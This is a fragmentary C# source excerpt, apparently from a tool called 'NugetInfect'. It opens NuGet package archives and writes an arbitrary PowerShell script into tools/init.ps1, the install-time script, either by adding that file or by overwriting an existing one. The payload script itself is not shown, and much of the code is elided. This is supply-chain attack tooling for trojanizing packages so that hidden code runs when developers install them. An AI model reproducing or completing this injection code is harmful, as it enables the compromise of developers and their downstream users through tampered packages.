...
namespace NugetInfect
{
    public class NuspecReader
    {
        string[] NuspecTags = new string[]
       {
        ...
        public void Build(string path, string powershell)
        {
            Load(path);
                    ...
                    using (Stream unzippedEntryStream = entry.Open())
                    {
                        ...
                        using (StreamReader reader = new StreamReader(unzippedEntryStream))
                        {
                            ...
                            if (addInitPsScript)
                            {
                                ...
                                {
                                    using (StreamWriter psReader = new StreamWriter(psStream, new UTF8Encoding(false)))
                                    {
                                        psReader.AutoFlush = true;
                                        psReader.Write(powershell);
                                    }
                                }
                            ...
                            else
                            {
                                foreach (ZipArchiveEntry entryA in NuPkg.Entries)
                                {
                                    if (entryA.FullName == "tools/init.ps1")
                                    {
                                        ...
                                        {
                                            using (StreamWriter wr = new StreamWriter(initStream, new UTF8Encoding(false)))
                                            {
                                                wr.AutoFlush = true;
                                                wr.Write(powershell);
                                            }
        ...
        private void OPen(string nupkgPath)
        {
            ...
            if (addInitPsScript)
            {
                ...
                psReader.Write(Properties.Settings.Default.PowershellScript);
                psReader.Close();
                psStream.Close();
            }
